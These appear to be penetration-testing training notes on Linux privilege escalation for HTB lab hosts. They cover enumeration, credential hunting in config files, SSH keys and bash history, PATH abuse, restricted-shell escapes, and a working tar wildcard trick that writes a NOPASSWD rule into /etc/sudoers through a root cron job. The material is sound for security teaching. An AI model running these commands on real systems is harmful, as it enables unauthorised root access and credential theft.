# Introduction to Linux Privilege Escalation
The root account on Linux systems provides full administrative level access to the operating system. During an assessment, you may gain a low-privileged shell on a Linux host and need to perform privilege escalation to the root account. Fully compromising the host would allow us to capture traffic and access sensitive files, which may be used to further access within the environment. Additionally, if the Linux machine is domain joined, we can gain the NTLM hash and begin enumerating and attacking Active Directory.

## Enumeration
Enumeration is the key to privilege escalation. Several helper scripts (such as LinEnum) exist to assist with enumeration. Still, it is also important to understand what pieces of information to look for and to be able to perform your enumeration manually. When you gain initial shell access to the host, it is important to check several key details.

OS Version: Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.

Kernel Version: As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.

Running Services: Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE-2016-9566, a local privilege escalation flaw in Nagios Core < 4.2.4.

### List Current Processes
```
ps aux | grep root
```
Installed Packages and Versions: Like running services, it is important to check for any out-of-date or vulnerable packages that may be easily leveraged for privilege escalation. An example is Screen, which is a common terminal multiplexer (similar to tmux). It allows you to start a session and open many windows or virtual terminals instead of opening multiple terminal sessions. Screen version 4.05.00 suffers from a privilege escalation vulnerability that can be easily leveraged to escalate privileges.

Logged in Users: Knowing which other users are logged into the system and what they are doing can provide greater insight into possible local lateral movement and privilege escalation paths.

### List Current Terminal-Attached Processes
```
ps au
```
User Home Directories: Are other user's home directories accessible? User home folders may also contain SSH keys that can be used to access other systems or scripts and configuration files containing credentials. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment.

### Home Directory Contents
```
ls /home
```
We can check individual user directories and check to see if files such as the .bash_history file are readable and contain any interesting commands, look for configuration files, and check to see if we can obtain copies of a user's SSH keys.

### User's Home Directory Contents
```
ls -la /home/stacey.jenkins/
```
If you find an SSH key for your current user, this could be used to open an SSH session on the host (if SSH is exposed externally) and gain a stable and fully interactive session. SSH keys could be leveraged to access other systems within the network as well. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.

### SSH Directory Contents
```
ls -l ~/.ssh
```
It is also important to check a user's bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.

### Bash History
```
history
```
Sudo Privileges: Can the user run any commands either as another user or as root? If you do not have credentials for the user, it may not be possible to leverage sudo permissions. However, often sudoer entries include NOPASSWD, meaning that the user can run the specified command without being prompted for a password. Not all commands, even we can run as root, will lead to privilege escalation. It is not uncommon to gain access as a user with full sudo privileges, meaning they can run any command as root. Issuing a simple sudo su command will immediately give you a root session.

### Sudo - List User's Privileges
```
sudo -l
```

Configuration Files: Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as .conf and .config, for usernames, passwords, and other secrets.

Readable Shadow File: If the shadow file is readable, you will be able to gather password hashes for all users who have a password set. While this does not guarantee further access, these hashes can be subjected to an offline brute-force attack to recover the cleartext password.

Password Hashes in /etc/passwd: Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the shadow file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.

### Passwd
```
cat /etc/passwd
```

Cron Jobs: Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.

### Cron Jobs
```
ls -la /etc/cron.daily/
```
Unmounted File Systems and Additional Drives: If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

### File Systems & Additional Drives
```
lsblk
```


SETUID and SETGID Permissions: Binaries are set with these permissions to allow a user to run a command as root, without having to grant root-level access to the user. Many binaries contain functionality that can be exploited to get a root shell.

Writeable Directories: It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.

### Find Writable Directories

```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

Writeable Files: Are any scripts or configuration files world-writable? While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command.

### Find Writable Files
```
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

# Environment Enumeration

## Gaining Situational Awareness

Let's say we have just gained access to a Linux host by exploiting an unrestricted file upload vulnerability during an External Penetration Test. After establishing our reverse shell (and ideally some sort of persistence), we should start by gathering some basics about the system we are working with.

First, we'll answer the fundamental question: What operating system are we dealing with? If we landed on a CentOS host or Red Hat Enterprise Linux host, our enumeration would likely be slightly different than if we landed on a Debian-based host such as Ubuntu. If we land on a host such as FreeBSD, Solaris, or something more obscure such as the HP proprietary OS HP-UX or the IBM OS AIX, the commands we would work with will likely be different. Though the commands may be different, and we may even need to look up a command reference in some instances, the principles are the same. For our purposes, we'll begin with an Ubuntu target to cover general tactics and techniques. Once we learn the basics and combine them with a new way of thinking and the stages of the Penetration Testing Process, it shouldn't matter what type of Linux system we land on because we'll have a thorough and repeatable process.

Typically we'll want to run a few basic commands to orient ourselves:
 * whoami - what user are we running as
 * id - what groups does our user belong to?
 * hostname - what is the server named, can we gather anything from the naming convention?
 * ifconfig or ip a - what subnet did we land in, does the host have additional NICs in other subnets?
 * sudo -l - can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do something like sudo su and drop right into a root shell.
```
cat /etc/os-release
```
Next we'll want to check out our current user's PATH, which is where the Linux system looks every time a command is executed for any executables to match the name of what we type.
```
echo $PATH
```
We can also check out all environment variables that are set for our current user, we may get lucky and find something sensitive in there such as a password. We'll note this down and move on.
```
env
```
Next let's note down the Kernel version. We can do some searches to see if the target is running a vulnerable Kernel (which we'll get to take advantage of later on in the module) which has some known public exploit PoC. We can do this a few ways, another way would be cat /proc/version but we'll use the uname -a command.
```
uname -a
```
We can next gather some additional information about the host itself such as the CPU type/version:
```
lscpu
```
What login shells exist on the server? Note these down and highlight that both Tmux and Screen are available to us.
```
cat /etc/shells
```
We should also check to see if any defenses are in place and we can enumerate any information about them. Some things to look for include:
 * Exec Shield
 * iptables
 * AppArmor
 * SELinux
 * Fail2ban
 * Snort
 * Uncomplicated Firewall (ufw)

Often we will not have the privileges to enumerate the configurations of these protections but knowing what, if any, are in place, can help us not to waste time on certain tasks.

Next we can take a look at the drives and any shares on the system. First, we can use the lsblk command to enumerate information about block devices on the system (hard disks, USB drives, optical drives, etc.). If we discover and can mount an additional drive or unmounted file system, we may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

```
lsblk
```
The command lpstat can be used to find information about any printers attached to the system. If there are active or queued print jobs can we gain access to some sort of sensitive information?

We should also check for mounted drives and unmounted drives. Can we mount an umounted drive and gain access to sensitive data? Can we find any types of credentials in fstab for mounted drives by grepping for common words such as password, username, credential, etc in /etc/fstab?
```
cat /etc/fstab

```
Check out the routing table by typing route or netstat -rn. Here we can see what other networks are available via which interface.
```
route
```
In a domain environment we'll definitely want to check /etc/resolv.conf if the host is configured to use internal DNS we may be able to use this as a starting point to query the Active Directory environment.

We'll also want to check the arp table to see what other hosts the target has been communicating with.
```
arp -a
```

The environment enumeration also includes knowledge about the users that exist on the target system. This is because individual users are often configured during the installation of applications and services to limit the service's privileges. The reason for this is to maintain the security of the system itself. Because if a service is running with the highest privileges (root) and this is brought under control by an attacker, the attacker automatically has the highest rights over the entire system. All users on the system are stored in the /etc/passwd file. The format gives us some information, such as:

 * Username
 * Password
 * User ID (UID)
 * Group ID (GID)
 * User ID info
 * Home directory
 * Shell

### Existing Users

```
cat /etc/passwd
cat /etc/passwd | cut -f1 -d:
```
### Existing Groups
```
cat /etc/group
```
The /etc/group file lists all of the groups on the system. We can then use the getent command to list members of any interesting groups.
```
getent group sudo
```

We can also check out which users have a folder under the /home directory. We'll want to enumerate each of these to see if any of the system users are storing any sensitive data, files containing passwords. We should check to see if files such as the .bash_history file are readable and contain any interesting commands and look for configuration files. It is not uncommon to find files containing credentials that can be leveraged to access other systems or even gain entry into the Active Directory environment. Its also important to check for SSH keys for all users, as these could be used to achieve persistence on the system, potentially to escalate privileges, or to assist with pivoting and port forwarding further into the internal network. At the minimum, check the ARP cache to see what other hosts are being accessed and cross-reference these against any useable SSH private keys.

### Mounted File Systems
```
 df -h
```
### Unmounted File Systems
```
cat /etc/fstab | grep -v "#" | column -t
```
### All Hidden Files
```
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep htb-student
```
### All Hidden Directories
```
find / -type d -name ".*" -ls 2>/dev/null
```
### Temporary Files
```
ls -l /tmp /var/tmp /dev/shm
```

# Linux Services & Internals Enumeration
 * What services and applications are installed?
 * What services are running?
 * What sockets are in use?
 * What users, admins, and groups exist on the system?
 * Who is current logged in? What users recently logged in?
 * What password policies, if any, are enforced on the host?
 * Is the host joined to an Active Directory domain?
 * What types of interesting information can we find in history, log, and backup files
 * Which files have been modified recently and how often? Are there any interesting patterns in file modification that could indicate a cron job in use that we may be able to hijack?
 * Current IP addressing informationAnything interesting in the /etc/hosts file?
 * Are there any interesting network connections to other systems in the internal network or even outside the network?
 * What tools are installed on the system that we may be able to take advantage of? (Netcat, Perl, Python, Ruby, Nmap, tcpdump, gcc, etc.)
 * Can we access the bash_history file for any users and can we uncover any thing interesting from their recorded command line history such as passwords?
 * Are any Cron jobs running on the system that we may be able to hijack?

## Internals
When we talk about the internals, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks. So we start with the interfaces through which our target system can communicate.
```
ip a
```
Is there anything interesting in the /etc/hosts file?

### Hosts
```
cat /etc/hosts
```
It can also be helpful to check out each user's last login time to try to see when users typically log in to the system and how frequently. This can give us an idea of how widely used this system is which can open up the potential for more misconfigurations or "messy" directories or command histories.

### User's Last Login
```
lastlog
```
In addition, let's see if anyone else is currently on the system with us. There are a few ways to do this, such as the who command. The finger command will work to display this information on some Linux systems. 

### Logged In Users

```
w
```
It is also important to check a user's bash history, as they may be passing passwords as an argument on the command line, working with git repositories, setting up cron jobs, and more. Reviewing what the user has been doing can give you considerable insight into the type of server you land on and give a hint as to privilege escalation paths.

### Command History
```
history
```
Sometimes we can also find special history files created by scripts or programs. This can be found, among others, in scripts that monitor certain activities of users and check for suspicious activities.

### Finding History Files
```
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```
It's also a good idea to check for any cron jobs on the system. Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.

### Cron
```
ls -la /etc/cron.daily/
```

The [proc filesystem](https://man7.org/linux/man-pages/man5/proc.5.html) (proc / procfs) is a particular filesystem in Linux that contains information about system processes, hardware, and other system information. It is the primary way to access process information and can be used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically generated by the kernel. It can be used to look up system information such as the state of running processes, kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority, scheduling, and memory allocation.

### Proc
```
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
```

## Services
If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.

### Installed Packages
```
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
```
It's also a good idea to check if the sudo version installed on the system is vulnerable to any legacy or recent exploits.

### Sudo Version
```
sudo -V
```
Occasionally it can also happen that no direct packages are installed on the system but compiled programs in the form of binaries. These do not require installation and can be executed directly by the system itself.

### Binaries
```
ls -l /bin /usr/bin/ /usr/sbin/
```
[GTFObins](https://gtfobins.github.io/) provides an excellent platform that includes a list of binaries that can potentially be exploited to escalate our privileges on the target system. With the next oneliner, we can compare the existing binaries with the ones from GTFObins to see which binaries we should investigate later.


### GTFObins
```
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

```
We can use the diagnostic tool strace on Linux-based operating systems to track and analyze system calls and signal processing. It allows us to follow the flow of a program and understand how it accesses system resources, processes signals, and receives and sends data from the operating system. In addition, we can also use the tool to monitor security-related activities and identify potential attack vectors, such as specific requests to remote hosts using passwords or tokens.

The output of strace can be written to a file for later analysis, and it provides a wealth of options that allow detailed monitoring of the program's behavior.

### Trace System Calls

```
strace ping -c1 10.129.112.20
```

### Configuration Files
```
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
```
The scripts are similar to the configuration files. Often administrators are lazy and convinced of network security and neglect the internal security of their systems. These scripts, in some cases, have such wrong privileges that we will deal with later, but the contents are of great importance even without these privileges. Because through them, we can discover internal and individual processes that can be of great use to us.

### Scripts
```
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
```
Also, if we look at the process list, it can give us information about which scripts or binaries are in use and by which user. So, for example, if it is a script created by the administrator in his path and whose rights have not been restricted, we can run it without going into the root directory.

### Running Services by User
```
ps aux | grep root
```

# Credential Hunting

When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files:
```
htb_student@NIX02:~$ grep 'DB_USER\|DB_PASSWORD' wp-config.php

define( 'DB_USER', 'wordpressuser' );
define( 'DB_PASSWORD', 'WPadmin123!' );
```

The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).
```
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```
## SSH Keys


It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the known_hosts file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.
```
ls ~/.ssh
```

# Path Abuse

[PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type cat /tmp/test.txt instead of specifying the absolute path /bin/cat /tmp/test.txt. We can check the contents of the PATH variable by typing env | grep PATH or echo $PATH.

```
echo $PATH
```
Adding . to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as ls with a malicious script such as a reverse shell. If we add . to the path by issuing the command PATH=.:$PATH and then export PATH, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing ls will call the malicious script named ls in the current working directory instead of the binary located at /bin/ls).

```
PATH=.:${PATH}
export PATH
echo $PATH
```
In this example, we modify the path to run a simple echo command when the command ls is typed.
```
touch ls
echo 'echo "PATH ABUSE!!"' > ls
chmod +x ls
ls
```

# Wildcard Abuse

A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:
```

* 	An asterisk that can match any number of characters in a file name.
? 	Matches a single character.
[ ] 	Brackets enclose characters and can match any single one at the defined position.
~ 	A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.
- 	A hyphen within brackets will denote a range of characters.
```
An example of how wildcards can be abused for privilege escalation is the tar command, a common program for creating/extracting archives. If we look at the man page for the tar command, we see the following:
```
man tar
```
The --checkpoint-action option permits an EXEC action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, --checkpoint=1 and --checkpoint-action=exec=sh root.sh is passed to tar as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the /home/htb-student directory's contents and create a compressed archive within /home/htb-student. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

```
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```
We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

```
echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1

```
We can check and see that the necessary files were created.

```
ls -la

total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```
Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

```
sudo -l
```

# Escaping Restricted Shells

A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories. Restricted shells are often used to provide a safe environment for users who may accidentally or intentionally damage the system or provide a way for users to access only certain system features. Some common examples of restricted shells include the rbash shell in Linux and the "Restricted-access Shell" in Windows.

## RBASH
[Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) (rbash) is a restricted version of the Bourne shell, a standard command-line interpreter in Linux which limits the user's ability to use certain features of the Bourne shell, such as changing directories, setting or modifying environment variables, and executing commands in other directories. It is often used to provide a safe and controlled environment for users who may accidentally or intentionally damage the system.

## RKSH
[Restricted Korn shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) (rksh) is a restricted version of the Korn shell, another standard command-line interpreter. The rksh shell limits the user's ability to use certain features of the Korn shell, such as executing commands in other directories, creating or modifying shell functions, and modifying the shell environment.

## RZSH
[Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html) (rzsh) is a restricted version of the Z shell and is the most powerful and flexible command-line interpreter. The rzsh shell limits the user's ability to use certain features of the Z shell, such as running shell scripts, defining aliases, and modifying the shell environment.



For example, administrators often use restricted shells in enterprise networks to provide a safe and controlled environment for users who may accidentally or intentionally damage the system. By limiting the user's ability to execute specific commands or access certain directories, administrators can ensure that users cannot perform actions that could harm the system or compromise the network's security. Additionally, restricted shells can give users access to only certain system features, allowing administrators to control which resources and functions are available to each user.

Imagine a company with a network of Linux servers hosting critical business applications and services. Many users, including employees, contractors, and external partners, access the network. To protect the security and integrity of the network, the organization's IT team decided to implement restricted shells for all users.

To do this, the IT team sets up several rbash, rksh, and rzsh shells on the network and assigns each user to a specific shell. For example, external partners who need to access only certain network features, such as email and file sharing, are assigned to rbash shells, which limits their ability to execute specific commands and access certain directories. Contractors who need to access more advanced network features, such as database servers and web servers, are assigned to rksh shells, which provide them with more flexibility but still limit their abilities. Finally, employees who need to access the network for specific purposes, such as to run specific applications or scripts, are assigned to rzsh shells, which provide them with the most flexibility but still limit their ability to execute specific commands and access certain directories.

Several methods can be used to escape from a restricted shell. Some of these methods involve exploiting vulnerabilities in the shell itself, while others involve using creative techniques to bypass the restrictions imposed by the shell. Here are a few examples of methods that can be used to escape from a restricted shell.

## Escaping

In some cases, it may be possible to escape from a restricted shell by injecting commands into the command line or other inputs the shell accepts. For example, suppose the shell allows users to execute commands by passing them as arguments to a built-in command. In that case, it may be possible to escape from the shell by injecting additional commands into the argument.

### Command injection

Imagine that we are in a restricted shell that allows us to execute commands by passing them as arguments to the ls command. Unfortunately, the shell only allows us to execute the ls command with a specific set of arguments, such as ls -l or ls -a, but it does not allow us to execute any other commands. In this situation, we can use command injection to escape from the shell by injecting additional commands into the argument of the ls command.

For example, we could use the following command to inject a pwd command into the argument of the ls command:
```
ls -l `pwd` 
```

This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and see the current working directory, even though the shell does not allow us to execute the pwd command directly.

### Command Substitution
Another method for escaping from a restricted shell is to use command substitution. This involves using the shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute commands by enclosing them in backticks (`). In that case, it may be possible to escape from the shell by executing a command in a backtick substitution that is not restricted by the shell.

### Command Chaining
In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of which is not restricted by the shell.

### Environment Variables
For escaping from a restricted shell to use environment variables involves modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell uses an environment variable to specify the directory in which commands are executed, it may be possible to escape from the shell by modifying the value of the environment variable to specify a different directory.

### Shell Functions

In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape from the shell by defining a shell function that executes a command.
